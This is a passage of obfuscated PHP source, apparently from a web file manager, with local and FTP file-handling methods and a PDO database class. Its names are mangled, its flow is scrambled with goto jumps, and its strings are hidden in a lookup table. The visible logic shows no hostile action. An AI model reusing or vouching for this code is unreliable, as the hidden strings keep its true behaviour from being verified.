d˜ÈŠÃ÷; AÍÔ¶ÅÊŒ©: $a™Ê‡ÍÌ = @ftp_size($this->connect, $dÀ½Ã¿“Ÿ‡); if ($a™Ê‡ÍÌ != -1) { $aß‹ª×ŒœÀ[$C›¬åÉ´¥[77]] = $a™Ê‡ÍÌ; } else { $cã´ˆÏÎ¿„ = @ftp_chdir($this->connect, $dÀ½Ã¿“Ÿ‡); if (!$cã´ˆÏÎ¿„) { return !1; } $aß‹ª×ŒœÀ[$C›¬åÉ´¥[29]] = $C›¬åÉ´¥[76]; } return $aß‹ª×ŒœÀ; goto F›ò¦Ûæ²ì; d˜ÈŠÃ÷: $C›¬åÉ´¥ =& $_SERVER[…ë˜õ]; if ($dÀ½Ã¿“Ÿ‡ == $C›¬åÉ´¥[33] || $dÀ½Ã¿“Ÿ‡ == $C›¬åÉ´¥[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto bã²£à¢Ğ; bã²£à¢Ğ: $dÀ½Ã¿“Ÿ‡ = $this->iconvSystem($dÀ½Ã¿“Ÿ‡); $aß‹ª×ŒœÀ = array($C›¬åÉ´¥[28] => $this->iconvApp($dÀ½Ã¿“Ÿ‡), $C›¬åÉ´¥[29] => $C›¬åÉ´¥[191], $C›¬åÉ´¥[77] => 0); @ftp_chdir($this->connect, $C›¬åÉ´¥[8]); goto AÍÔ¶ÅÊŒ©; F›ò¦Ûæ²ì: } protected function _isFolder($e½—İÂÀ¸’) { $Dáİ‰à¤… =& $_SERVER[…ë˜õ]; if ($e½—İÂÀ¸’ == $Dáİ‰à¤…[33] || $e½—İÂÀ¸’ == $Dáİ‰à¤…[8]) { return !0; } $FÅ°¨ŸÚá = $this->_objectMeta($e½—İÂÀ¸’); return isset($FÅ°¨ŸÚá[$Dáİ‰à¤…[29]]) && $FÅ°¨ŸÚá[$Dáİ‰à¤…[29]] == $Dáİ‰à¤…[76] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($aÆåÜªË) { if (substr($aÆåÜªË, 0, 2) == $_SERVER[…ë˜õ][1249]) { $aÆåÜªË = BASIC_PATH . substr($aÆåÜªË, 2); } return $aÆåÜªË; } public function iconvApp($Dé¡Œ‰ÀÔ›) { $b ÍÃ›î¦Î =& $_SERVER[…ë˜õ]; global $config; return $this->iconvTo($Dé¡Œ‰ÀÔ›, $config[$b ÍÃ›î¦Î[1247]], $config[$b ÍÃ›î¦Î[1246]]); } public function iconvSystem($dƒ«íŸóí) { $bÌ¢ĞÜ·µà =& $_SERVER[…ë˜õ]; global $config; return $this->iconvTo($dƒ«íŸóí, $config[$bÌ¢ĞÜ·µà[1246]], $config[$bÌ¢ĞÜ·µà[1247]]); } public function getPathOuter($d§í†¨ğÚ) { goto dÈ¬›Éåƒ; A¯®Ï–ë»ª: return $this->pathDriver . $ešíÅ«†Ù[8] . ltrim($d§í†¨ğÚ, $ešíÅ«†Ù[8]); goto b××éæ®ä„; cøªˆ‚š­: $d§í†¨ğÚ = KodIO::clear($d§í†¨ğÚ); $d§í†¨ğÚ = substr($d§í†¨ğÚ, strlen($Eˆ³ƒ­å…)); if (empty($this->pathDriver)) { return $d§í†¨ğÚ; } goto A¯®Ï–ë»ª; dÈ¬›Éåƒ: $ešíÅ«†Ù =& $_SERVER[…ë˜õ]; $Eˆ³ƒ­å… = $this->iconvApp($this->pathBase); $d§í†¨ğÚ = $this->iconvApp($d§í†¨ğÚ); goto BÜˆ…™ø«; BÜˆ…™ø«: if (substr($Eˆ³ƒ­å…, 0, 2) == $ešíÅ«†Ù[1249]) { $Eˆ³ƒ­å… = BASIC_PATH . substr($Eˆ³ƒ­å…, 2); } if (substr($d§í†¨ğÚ, 0, 2) == $ešíÅ«†Ù[1249]) { $d§í†¨ğÚ = BASIC_PATH . substr($d§í†¨ğÚ, 2); } $Eˆ³ƒ­å… = KodIO::clear($Eˆ³ƒ­å…); goto cøªˆ‚š­; b××éæ®ä„: } public function mkfile($Aªï¾ˆÒ¬Š, $e¿ß×­—Í = '', $bóáŸæáÃŞ = REPEAT_RENAME) { $Aªï¾ˆÒ¬Š = $this->iconvSystem($Aªï¾ˆÒ¬Š); @touch($Aªï¾ˆÒ¬Š); if ($e¿ß×­—Í) { file_put_contents($Aªï¾ˆÒ¬Š, $e¿ß×­—Í); } return is_file($Aªï¾ˆÒ¬Š) ? $this->getPathOuter($Aªï¾ˆÒ¬Š) : !1; } public function mkdir($d­†‰ğ÷Ï×, $c”ğ©†Ëö– = REPEAT_SKIP) { $d­†‰ğ÷Ï× = $this->iconvSystem($d­†‰ğ÷Ï×); if (is_dir($d­†‰ğ÷Ï×)) { return $this->getPathOuter($d­†‰ğ÷Ï×); } @mkdir($d­†‰ğ÷Ï×, 511, !0); return is_dir($d­†‰ğ÷Ï×) ? $this->getPathOuter($d­†‰ğ÷Ï×) : !1; } public function copyFile($cŒŒíéÚ›¸, $C¸¢¥º»ä) { $this->mkdir($this->pathFather($C¸¢¥º»ä)); $cŒŒíéÚ›¸ = $this->iconvSystem($cŒŒíéÚ›¸); $C¸¢¥º»ä = $this->iconvSystem($C¸¢¥º»ä); $F÷Š˜¤ğ»… = copy_64($cŒŒíéÚ›¸, $C¸¢¥º»ä); return $F÷Š˜¤ğ»… ? $this->getPathOuter($C¸¢¥º»ä) : !1; } public function moveFile($FèÇŸ§îÍÕ, $BŠÉß¼ší‚) { $this->mkdir($this->pathFather($BŠÉß¼ší‚)); $FèÇŸ§îÍÕ = $this->iconvSystem($FèÇŸ§îÍÕ); $BŠÉß¼ší‚ = $this->iconvSystem($BŠÉß¼ší‚); $bŠó¢–Ø‰† = intval(@rename($FèÇŸ§îÍÕ, $BŠÉß¼ší‚)); if (!$bŠó¢–Ø‰†) { if ($bŠó¢–Ø‰† = intval(@copy_64($FèÇŸ§îÍÕ, $BŠÉß¼ší‚))) { @unlink($FèÇŸ§îÍÕ); } } return $bŠó¢–Ø‰† ? $this->getPathOuter($BŠÉß¼ší‚) : !1; } public function delFile($B¢êëõ§–í) { $B¢êëõ§–í = $this->iconvSystem($B¢êëõ§–í); if (!@unlink($B¢êëõ§–í)) { @chmod($B¢êëõ§–í, 511); if (!@unlink($B¢êëõ§–í)) { return !1; } } else { return !0; } } public function delFolder($d‘£”Íæ‹) { goto Eéêøì”òã; cØ°©Ä‹›: if (!($a¨Ÿ²ÔÃøš = opendir($d‘£”Íæ‹))) { return !1; } while (($Dƒ«¼òÊ§ñ = readdir($a¨Ÿ²ÔÃøš)) !== !1) { if ($Dƒ«¼òÊ§ñ == $DƒŒ–ÓŠèç[94] || $Dƒ«¼òÊ§ñ == $DƒŒ–ÓŠèç[1256]) { continue; } $BñÔ•‡¹¨Š = $d‘£”Íæ‹ . $DƒŒ–ÓŠèç[8] . $Dƒ«¼òÊ§ñ; if (is_file($BñÔ•‡¹¨Š) || is_link($BñÔ•‡¹¨Š)) { if (!unlink($BñÔ•‡¹¨Š)) { chmod($BñÔ•‡¹¨Š, 511); if (!unlink($BñÔ•‡¹¨Š)) { return !1; } } } else { if (is_dir($BñÔ•‡¹¨Š)) { chmod($BñÔ•‡¹¨Š, 511); $BñÔ•‡¹¨Š = $this->iconvApp($BñÔ•‡¹¨Š); if (!$this->delFolder($BñÔ•‡¹¨Š)) { return !1; } } } } closedir($a¨Ÿ²ÔÃøš); goto D•ÄÍƒé”ó; Eéêøì”òã: $DƒŒ–ÓŠèç =& $_SERVER[…ë˜õ]; $d‘£”Íæ‹ = $this->iconvSystem($d‘£”Íæ‹); if (!is_dir($d‘£”Íæ‹)) { return !0; } goto cØ°©Ä‹›; D•ÄÍƒé”ó: return rmdir($d‘£”Íæ‹); goto EäëØ¯ƒÁ¯; EäëØ¯ƒÁ¯: } public function rename($c…­ñ”¦Óİ, $F‰òò¬Ò…•) { goto dŞøğÛ…°Â; Dİ£óâ®ëÒ: $c…­ñ”¦Óİ = $this->iconvSystem($c…­ñ”¦Óİ); $dœ¹ñİù = $this->pathFather($c…­ñ”¦Óİ); $e‘óÈ—á¹˜ = rtrim($dœ¹ñİù, $aŠ•ŒÇİå[8]) . $aŠ•ŒÇİå[8] . $eÜ¶ÈØ˜ëÆ; goto A¸Úˆ¤Í©ù; A¸Úˆ¤Í©ù: $f„É„ËñöÑ = @rename($c…­ñ”¦Óİ, $e‘óÈ—á¹˜); $e‘óÈ—á¹˜ = $this->iconvApp($e‘óÈ—á¹˜); return $f„É„ËñöÑ ? $this->getPathOuter($e‘óÈ—á¹˜) : !1; goto bô‡ÆÑª„Ó; dŞøğÛ…°Â: $aŠ•ŒÇİå =& $_SERVER[…ë˜õ]; $eÜ¶ÈØ˜ëÆ = $this->fileNameAuto($this->pathFather($c…­ñ”¦Óİ), $F‰òò¬Ò…•); $eÜ¶ÈØ˜ëÆ = $this->iconvSystem($eÜ¶ÈØ˜ëÆ); goto Dİ£óâ®ëÒ; bô‡ÆÑª„Ó: } public function size($dŒŞËµéÛ) { $dŒŞËµéÛ = $this->iconvSystem($dŒŞËµéÛ); return filesize_64($dŒŞËµéÛ); } public function info($eÜªõ¡êàË) { $eÜªõ¡êàË = $this->iconvSystem($eÜªõ¡êàË); if ($this->isFolder($eÜªõ¡êàË)) { return $this->folderInfo($eÜªõ¡êàË); } else { if ($this->isFile($eÜªõ¡êàË)) { return $this->fileInfo($eÜªõ¡êàË); } } return !1; } protected function infoChildren($Cäâïêˆ, &$bàŠµßİªÒ, $aôÓ‡† ” = true) { goto C«Ø¶¸ÂˆŒ; BÖº‡‰ö¤: if ($aôÓ‡† ”) { $Cäâïêˆ = $this->iconvSystem($Cäâïêˆ); } if (!($DÍ¹ºŸÊ¢ = @opendir($Cäâïêˆ))) { return; } while (($E×ÚæÂÚ•ù = readdir($DÍ¹ºŸÊ¢)) !== !1) { if ($E×ÚæÂÚ•ù == $FÈôã…–Ñ­[94] || $E×ÚæÂÚ•ù == $FÈôã…–Ñ­[1256]) { continue; } $d‹ÂÙ†æ½ç = $Cäâïêˆ . $E×ÚæÂÚ•ù; if (is_file($d‹ÂÙ†æ½ç) || is_link($d‹ÂÙ†æ½ç)) { $bàŠµßİªÒ[$FÈôã…–Ñ­[78]]++; $bàŠµßİªÒ[$FÈôã…–Ñ­[77]] += filesize_64($d‹ÂÙ†æ½ç); } else { if (is_dir($d‹ÂÙ†æ½ç)) { $bàŠµßİªÒ[$FÈôã…–Ñ­[79]]++; $this->infoChildren($d‹ÂÙ†æ½ç, $bàŠµßİªÒ, !1); } } } goto C•î´‘×²è; C«Ø¶¸ÂˆŒ: $FÈôã…–Ñ­ =& $_SERVER[…ë˜õ]; check_abort_echo(); $Cäâïêˆ = rtrim($Cäâïêˆ, $FÈôã…–Ñ­[8]) . $FÈôã…–Ñ­[8]; goto BÖº‡‰ö¤; C•î´‘×²è: closedir($DÍ¹ºŸÊ¢); goto cÊğÏó…ë‹; cÊğÏó…ë‹: } private function folderInfo($d¾’Ôº²µ×, $aùãÄ×ô¿Í = false) { $Aö¥èçÔŞ =& $_SERVER[…ë˜õ]; $d¾’Ôº²µ× = rtrim($d¾’Ôº²µ×, $Aö¥èçÔŞ[8]) . $Aö¥èçÔŞ[8]; $A‹¬Å½ÚÍ = $this->iconvApp($this->pathThis($d¾’Ôº²µ×)); if ($aùãÄ×ô¿Í) { return array($Aö¥èçÔŞ[28] => $A‹¬Å½ÚÍ, $Aö¥èçÔŞ[75] => $this->getPathOuter($d¾’Ôº²µ×), $Aö¥èçÔŞ[29] => $Aö¥èçÔŞ[76]); } $F§Ÿ¾Ú¥ = array($Aö¥èçÔŞ[28] => $A‹¬Å½ÚÍ, $Aö¥èçÔŞ[75] => $this->getPathOuter($d¾’Ôº²µ×), $Aö¥èçÔŞ[29] => $Aö¥èçÔŞ[76], $Aö¥èçÔŞ[192] => @filectime($d¾’Ôº²µ×), $Aö¥èçÔŞ[83] => @filemtime($d¾’Ôº²µ×), $Aö¥èçÔŞ[1259] => @fileatime($d¾’Ôº²µ×), $Aö¥èçÔŞ[1260] => is_readable($d¾’Ôº²µ×), $Aö¥èçÔŞ[1261] => is_writable($d¾’Ôº²µ×), $Aö¥èçÔŞ[1262] => get_mode($d¾’Ôº²µ×)); return $F§Ÿ¾Ú¥; } private function fileInfo($fÉ÷‘×ã´, $Dßã¾ÇÃ·ƒ = false) { $d»Ã¯ò¾¨ =& $_SERVER[…ë˜õ]; $F¸ÕâíÍ Å = $this->iconvApp($this->pathThis($fÉ÷‘×ã´)); if ($Dßã¾ÇÃ·ƒ) { return array($d»Ã¯ò¾¨[28] => $F¸ÕâíÍ Å, $d»Ã¯ò¾¨[75] => $this->getPathOuter($fÉ÷‘×ã´), $d»Ã¯ò¾¨[29] => $d»Ã¯ò¾¨[191], $d»Ã¯ò¾¨[77] => $this->size($fÉ÷‘×ã´), $d»Ã¯ò¾¨[167] => $this->ext($F¸ÕâíÍ Å)); } $a¬íãˆ¾…À = array($d»Ã¯ò¾¨[28] => $F¸ÕâíÍ Å, $d»Ã¯ò¾¨[75] => $this->getPathOuter($fÉ÷‘×ã´), $d»Ã¯ò¾¨[29] => $d»Ã¯ò¾¨[191], $d»Ã¯ò¾¨[192] => @filectime($fÉ÷‘×ã´), $d»Ã¯ò¾¨[83] => @filemtime($fÉ÷‘×ã´), $d»Ã¯ò¾¨[1259] => @fileatime($fÉ÷‘×ã´), $d»Ã¯ò¾¨[77] => $this->size($fÉ÷‘×ã´), $d»Ã¯ò¾¨[167] => $this->ext($F¸ÕâíÍ Å), $d»Ã¯ò¾¨[1260] => is_readable($fÉ÷‘×ã´), $d»Ã¯ò¾¨[1261] => is_writable($fÉ÷‘×ã´), $d»Ã¯ò¾¨[1262] => get_mode($fÉ÷‘×ã´)); return $a¬íãˆ¾…À; } public function exist($eÄæŠ¤¬÷) { $eÄæŠ¤¬÷ = $this->iconvSystem($eÄæŠ¤¬÷); return @file_exists($eÄæŠ¤¬÷); } public function isFile($d¹º—ª¸¦) { $d¹º—ª¸¦ = $this->iconvSystem($d¹º—ª¸¦); return @is_file($d¹º—ª¸¦); } public function isFolder($AÑ¸˜Œ¨èÓ) { $AÑ¸˜Œ¨èÓ = $this->iconvSystem($AÑ¸˜Œ¨èÓ); return @is_dir($AÑ¸˜Œ¨èÓ); } public function listPath($d©÷Øøï¬, $AÌ…š”½­… = false) { goto dê‰ï„î‹¨; FŞáÂÈØ‰: closedir($dÁØÒ“‡À); return $e‡áöÉãš¬; goto BöÛÃ¡ï¿¯; bß÷¡¡¾—: $e‡áöÉãš¬ = array($e”¡‚»Ã¸[74] => array(), $e”¡‚»Ã¸[73] => array()); if (!($dÁØÒ“‡À = @opendir($d©÷Øøï¬))) { return $e‡áöÉãš¬; } while (($A…ÇÓ¡ÉÌÉ = readdir($dÁØÒ“‡À)) !== !1) { if ($A…ÇÓ¡ÉÌÉ == $e”¡‚»Ã¸[94] || $A…ÇÓ¡ÉÌÉ == $e”¡‚»Ã¸[1256]) { continue; } $a¸Š¥¡šßß = $d©÷Øøï¬ . $A…ÇÓ¡ÉÌÉ; if (is_file($a¸Š¥¡šßß)) { $e‡áöÉãš¬[$e”¡‚»Ã¸[73]][] = $this->fileInfo($a¸Š¥¡šßß, $AÌ…š”½­…); } else { $e‡áöÉãš¬[$e”¡‚»Ã¸[74]][] = $this->folderInfo($a¸Š¥¡šßß, $AÌ…š”½­…); } } goto FŞáÂÈØ‰; dê‰ï„î‹¨: $e”¡‚»Ã¸ =& $_SERVER[…ë˜õ]; $d©÷Øøï¬ = $this->iconvSystem($d©÷Øøï¬); $d©÷Øøï¬ = rtrim($d©÷Øøï¬, $e”¡‚»Ã¸[8]) . $e”¡‚»Ã¸[8]; goto bß÷¡¡¾—; BöÛÃ¡ï¿¯: } public function listAll($aÄÛ—½¢, &$C†“ŠÂ¯¿Á = array()) { goto E¬†¡ŒØ¬; E¬†¡ŒØ¬: $d®ğ¨ãç—´ =& $_SERVER[…ë˜õ]; $aÄÛ—½¢ = $this->iconvSystem($aÄÛ—½¢); $aÄÛ—½¢ = rtrim($aÄÛ—½¢, $d®ğ¨ãç—´[8]) . $d®ğ¨ãç—´[8]; goto bôåâî»¹Ç; bôåâî»¹Ç: if (!($DÚÈ¿¬„ê® = @opendir($aÄÛ—½¢))) { return $C†“ŠÂ¯¿Á; } while (($bÆß¬©‡ğ” = readdir($DÚÈ¿¬„ê®)) !== !1) { if ($bÆß¬©‡ğ” == $d®ğ¨ãç—´[94] || $bÆß¬©‡ğ” == $d®ğ¨ãç—´[1256]) { continue; } $D¨µ‚Œ¦×Ñ = $aÄÛ—½¢ . $bÆß¬©‡ğ”; if (is_dir($D¨µ‚Œ¦×Ñ) && !is_link($D¨µ‚Œ¦×Ñ)) { $C†“ŠÂ¯¿Á[] = array($d®ğ¨ãç—´[75] => $D¨µ‚Œ¦×Ñ . $d®ğ¨ãç—´[8], $d®ğ¨ãç—´[76] => 1, $d®ğ¨ãç—´[83] => @filemtime($D¨µ‚Œ¦×Ñ), $d®ğ¨ãç—´[77] => 0); $this->listAll($D¨µ‚Œ¦×Ñ, $C†“ŠÂ¯¿Á); } else { $C†“ŠÂ¯¿Á[] = array($d®ğ¨ãç—´[75] => $D¨µ‚Œ¦×Ñ, $d®ğ¨ãç—´[76] => 0, $d®ğ¨ãç—´[83] => @filemtime($D¨µ‚Œ¦×Ñ), $d®ğ¨ãç—´[77] => $this->size($D¨µ‚Œ¦×Ñ)); } } closedir($DÚÈ¿¬„ê®); goto FÛÕ‘ çÅŠ; FÛÕ‘ çÅŠ: return $C†“ŠÂ¯¿Á; goto f¹“í„íŠß; f¹“í„íŠß: } public function has($b­°‘ÀÆ¤›, $fÀ¨ó‚‹è… = false, $cÆ—Œ‡ã»Ã = true) { goto fÚéê­ÚÀî; fÚéê­ÚÀî: $aƒ±Ñ¦‘Ÿ =& $_SERVER[…ë˜õ]; $b­°‘ÀÆ¤› = $this->iconvSystem($b­°‘ÀÆ¤›); $b­°‘ÀÆ¤› = rtrim($b­°‘ÀÆ¤›, $aƒ±Ñ¦‘Ÿ[8]) . $aƒ±Ñ¦‘Ÿ[8]; goto f÷ñ» ×§; f÷ñ» ×§: if (!($DŒÎí·ˆŒø = @opendir($b­°‘ÀÆ¤›))) { return !1; } $fÉá´è¶­Ã = 0; $bÅİ×ãĞĞŠ = 0; goto f¢Àæíµô; f¢Àæíµô: $CÔ“ÈĞ”ÃŠ = 0; while (($eáàÏƒ·Ùš = readdir($DŒÎí·ˆŒø)) !== !1) { if ($eáàÏƒ·Ùš == $aƒ±Ñ¦‘Ÿ[94] || $eáàÏƒ·Ùš == $aƒ±Ñ¦‘Ÿ[1256]) { continue; } $AÒ„¿´ñº = $b­°‘ÀÆ¤› . $eáàÏƒ·Ùš; if ($fÀ¨ó‚‹è…) { $CÔ“ÈĞ”ÃŠ++; if (@is_file($AÒ„¿´ñº)) { $fÉá´è¶­Ã++; } else { $bÅİ×ãĞĞŠ++; } if ($CÔ“ÈĞ”ÃŠ > 10000) { break; } continue; } if ($cÆ—Œ‡ã»Ã) { if (@is_file($AÒ„¿´ñº)) { return !0; } } else { if (@is_dir($AÒ„¿´ñº . $aƒ±Ñ¦‘Ÿ[8])) { return !0; } } } closedir($DŒÎí·ˆŒø); goto b¿‰„“Şà; b¿‰„“Şà: if ($fÀ¨ó‚‹è…) { return array($aƒ±Ñ¦‘Ÿ[201] => $fÉá´è¶­Ã, $aƒ±Ñ¦‘Ÿ[202] => $bÅİ×ãĞĞŠ); } return !1; goto FÎßŠÁŠ; FÎßŠÁŠ: } public function hashSimple($B”ìªšËª) { goto C‚ê•‚ö›; C¬²­è›Éö: fseek_64($D›¢‚›˜Š, $C³¨æÙšòñ - $B„¢±·î¾Í); $DˆÊ·ñÛŸ¦ .= fread($D›¢‚›˜Š, $B„¢±·î¾Í); fclose($D›¢‚›˜Š); goto A‡ªâˆôÇò; c³Ğã»Æ¿Ë: if ($C³¨æÙšòñ <= $B„¢±·î¾Í * $aÃçêõ÷ÂÜ) { return $this->hashMd5($B”ìªšËª) . $C³¨æÙšòñ; } $DˆÊ·ñÛŸ¦ = $Fóø™˜‚¶²[33]; $A¤Ó»ÃàˆÁ = intval($C³¨æÙšòñ / $aÃçêõ÷ÂÜ); goto cÙ•š–é‰œ; C‚ê•‚ö›: $Fóø™˜‚¶² =& $_SERVER[…ë˜õ]; if (!$B”ìªšËª) { return md5($Fóø™˜‚¶²[33]); } $B”ìªšËª = $this->iconvSystem($B”ìªšËª); goto CâÜ’…á„ô; cÙ•š–é‰œ: $D›¢‚›˜Š = fopen($B”ìªšËª, $Fóø™˜‚¶²[1263]); if (!$D›¢‚›˜Š) { return $DˆÊ·ñÛŸ¦; } for ($eßª”ªÓÇ = 0; $eßª”ªÓÇ < $aÃçêõ÷ÂÜ; $eßª”ªÓÇ++) { fseek_64($D›¢‚›˜Š, $A¤Ó»ÃàˆÁ * $eßª”ªÓÇ); $DˆÊ·ñÛŸ¦ .= fread($D›¢‚›˜Š, $B„¢±·î¾Í); } goto C¬²­è›Éö; CâÜ’…á„ô: $C³¨æÙšòñ = $this->size($B”ìªšËª); $B„¢±·î¾Í = 200; $aÃçêõ÷ÂÜ = 50; goto c³Ğã»Æ¿Ë; A‡ªâˆôÇò: return md5($DˆÊ·ñÛŸ¦) . $C³¨æÙšòñ; goto D‘£²—¢Ã; D‘£²—¢Ã: } public function getContent($c›­…«ËÛ) { $c›­…«ËÛ = $this->iconvSystem($c›­…«ËÛ); return file_get_contents($c›­…«ËÛ); } public function setContent($aÔÖ…—Öí, $Aää°õËåĞ = '') { $aÔÖ…—Öí = $this->iconvSystem($aÔÖ…—Öí); $e‘Ö„êÛ— = @file_put_contents($aÔÖ…—Öí, $Aää°õËåĞ, LOCK_EX); clearstatcache(); return $e‘Ö„êÛ— === !1 ? !1 : !0; } public function fileSubstr($eŠÃ¸¹ÂåÂ, $c–³£¬‘Ê÷ = 0, $díÅŠ¯±È¹ = false) { goto aëÇšÂ¹„ï; aëÇšÂ¹„ï: $eé‰á›ÀÔø =& $_SERVER[…ë˜õ]; $eŠÃ¸¹ÂåÂ = $this->iconvSystem($eŠÃ¸¹ÂåÂ); if ($díÅŠ¯±È¹ === !1) { $díÅŠ¯±È¹ = $this->size($eŠÃ¸¹ÂåÂ); } goto AÖ¬‡ ğİÚ; d­â¢Öêµë: return $F±§çğ•; goto a‘Ùˆ¯š¹; AÖ¬‡ ğİÚ: if ($díÅŠ¯±È¹ <= 0) { return $eé‰á›ÀÔø[33]; } $aÃ—íÇ²í™ = fopen($eŠÃ¸¹ÂåÂ, $eé‰á›ÀÔø[1263]); if (!$aÃ—íÇ²í™) { return !1; } goto cš‘’ÈùŸ‡; cš‘’ÈùŸ‡: fseek_64($aÃ—íÇ²í™, $c–³£¬‘Ê÷); $F±§çğ• = fread($aÃ—íÇ²í™, $díÅŠ¯±È¹); fclose($aÃ—íÇ²í™); goto d­â¢Öêµë; a‘Ùˆ¯š¹: } public function upload($cÂóŞÃãÕË, $fàĞÏÚ—‡, $a“ÉßÓ…˜³ = false, $E²ÜºÑœŞÖ = REPEAT_REPLACE) { $a´‰ò§øœˆ = $this->copyFile($fàĞÏÚ—‡, $cÂóŞÃãÕË); return $a´‰ò§øœˆ ? $this->getPathOuter($cÂóŞÃãÕË) : !1; } public function setModifyTime($A¤¹œĞÅñï, $C¤°Â¦‰œµ = '') { @touch($A¤¹œĞÅñï, intval($C¤°Â¦‰œµ)); } public function download($CğîÁÔ‚È¬, $f•³ÈÜÔ©Ä) { return $this->iconvSystem($CğîÁÔ‚È¬); } } goto fÍ¼ß˜ÇºÂ; F¾¦ÙÔ§äç: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($C¦¨Ó­Ú¯ = '') { $eôÄ‹¯›Œ =& $_SERVER[…ë˜õ]; if (!class_exists($eôÄ‹¯›Œ[879])) { think_exception(think_lang($eôÄ‹¯›Œ[10]) . $eôÄ‹¯›Œ[880]); } if (!empty($C¦¨Ó­Ú¯)) { $this->config = $C¦¨Ó­Ú¯; if (empty($this->config[$eôÄ‹¯›Œ[13]])) { $this->config[$eôÄ‹¯›Œ[13]] = array(); } } } public function connect($EÑí¦£Êƒë = '', $fÚ¢±·ÍÛ‡ = 0) { $aé½—Á·æ =& $_SERVER[…ë˜õ]; if (!isset($this->linkID[$fÚ¢±·ÍÛ‡])) { goto B™øñãèÎª; Eæ ÷‚ì¢Ñ: try { $this->linkID[$fÚ¢±·ÍÛ‡] = new PDO($EÑí¦£Êƒë[$aé½—Á·æ[881]], $EÑí¦£Êƒë[$aé½—Á·æ[854]], $EÑí¦£Êƒë[$aé½—Á·æ[855]], $EÑí¦£Êƒë[$aé½—Á·æ[13]]); } catch (PDOException $aÊ®Öêªµª) { think_exception($aÊ®Öêªµª->getMessage()); } $this->dbType = $this->_getDsnType($EÑí¦£Êƒë[$aé½—Á·æ[881]]); if (in_array($this->dbType, array($aé½—Á·æ[882], $aé½—Á·æ[883], $aé½—Á·æ[884], $aé½—Á·æ[885]))) { think_exception($aé½—Á·æ[886] . $this->dbType . $aé½—Á·æ[887] . $this->dbType . $aé½—Á·æ[888]); } goto bÌˆÏƒÇóš; cŞøİØ«é: if (1 != think_config($aé½—Á·æ[18])) { unset($this->config); } goto fò©ÄÈÊ„; B™øñãèÎª: if (empty($EÑí¦£Êƒë)) { $EÑí¦£Êƒë = $this->config; } $BóôÂíÀÙ¢ = !empty($EÑí¦£Êƒë[$aé½—Á·æ[13]][$aé½—Á·æ[14]]) ? $EÑí¦£Êƒë[$aé½—Á·æ[13]][$aé½—Á·æ[14]] : $this->pconnect; if ($BóôÂíÀÙ¢) { $EÑí¦£Êƒë[$aé½—Á·æ[13]][PDO::ATTR_PERSISTENT] = !0; } goto Eæ ÷‚ì¢Ñ; bÌˆÏƒÇóš: if (!$this->linkID[$fÚ¢±·ÍÛ‡]) { think_exception($aé½—Á·æ[889]); } try { $this->linkID[$fÚ¢±·ÍÛ‡]->exec($aé½—Á·æ[890] . think_config($aé½—Á·æ[857])); } catch (Exception $aÊ®Öêªµª) { } $this->connected = !0; goto cŞøİØ«é; fò©ÄÈÊ„: } return $this->linkID[$fÚ¢±·ÍÛ‡]; } public function free() { $this->PDOStatement = null; } public function query($fÖ¨Ïº», $CšŞïóòë‰ = array()) { goto EÉ¶Ñ³àŞ‰; C¥ŸÕ³µ±: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $AŸÔù÷Ä = $this->PDOStatement->execute($CšŞïóòë‰); $this->debug(); goto e³ß’…©¾Õ; béÙÏŞÌ‘¶: $this->queryStr = $fÖ¨Ïº»; if (!empty($CšŞïóòë‰)) { $this->queryStr .= $B©¥ÚÓ¯¡[891] . print_r($CšŞïóòë‰, !0) . $B©¥ÚÓ¯¡[892]; } if (!empty($this->PDOStatement)) { $this->free(); } goto c¸æ¶ää™ˆ; EÉ¶Ñ³àŞ‰: $B©¥ÚÓ¯¡ =& $_SERVER[…ë˜õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto béÙÏŞÌ‘¶; c¸æ¶ää™ˆ: think_action_status($B©¥ÚÓ¯¡[19], 1); think_status($B©¥ÚÓ¯¡[20]); $this->PDOStatement = $this->_linkID->prepare($fÖ¨Ïº»); goto C¥ŸÕ³µ±; e³ß’…©¾Õ: if (!1 === $AŸÔù÷Ä) { $this->error(); return !1; } else { return $this->getAll(); } goto B¯î æé‡; B¯î æé‡: } public function execute($Cíì°íÌ, $e‡¥òöÌ±‘ = array()) { goto b„“ƒÒªİ; eã¢Æí‡ñŸ: $f°Ÿğµ¼Ú‹ = $this->PDOStatement->execute($e‡¥òöÌ±‘); $this->debug(); if (!1 === $f°Ÿğµ¼Ú‹) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bœğÁ‹‰Â¼ || preg_match($a±‡ùÖ³èÖ[897], $Cíì°íÌ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto f®ÖÃŞÄ²ß; b„“ƒÒªİ: $a±‡ùÖ³èÖ =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EÁê¬Öè; eƒÇŒœ‚ƒ‹: if ($this->dbType == $a±‡ùÖ³èÖ[885]) { if (preg_match($a±‡ùÖ³èÖ[893], $this->queryStr, $cß«ÁÑ¡´)) { $this->table = think_config($a±‡ùÖ³èÖ[894]) . str_ireplace(think_config($a±‡ùÖ³èÖ[895]), $a±‡ùÖ³èÖ[373], $cß«ÁÑ¡´[2]); $bœğÁ‹‰Â¼ = (bool) $this->query($a±‡ùÖ³èÖ[896] . strtoupper($this->table) . $a±‡ùÖ³èÖ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($a±‡ùÖ³èÖ[21], 1); goto f¶¥½¿Ú; f¶¥½¿Ú: think_status($a±‡ùÖ³èÖ[20]); $this->PDOStatement = $this->_linkID->prepare($Cíì°íÌ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eã¢Æí‡ñŸ; EÁê¬Öè: $this->queryStr = $Cíì°íÌ; if (!empty($e‡¥òöÌ±‘)) { $this->queryStr .= $a±‡ùÖ³èÖ[891] . print_r($e‡¥òöÌ±‘, !0) . $a±‡ùÖ³èÖ[892]; } $bœğÁ‹‰Â¼ = !1; goto eƒÇŒœ‚ƒ‹; f®ÖÃŞÄ²ß: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bâ‡²ªšĞÙ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Bâ‡²ªšĞÙ) { $this->error(); return !1; } } return !0; } 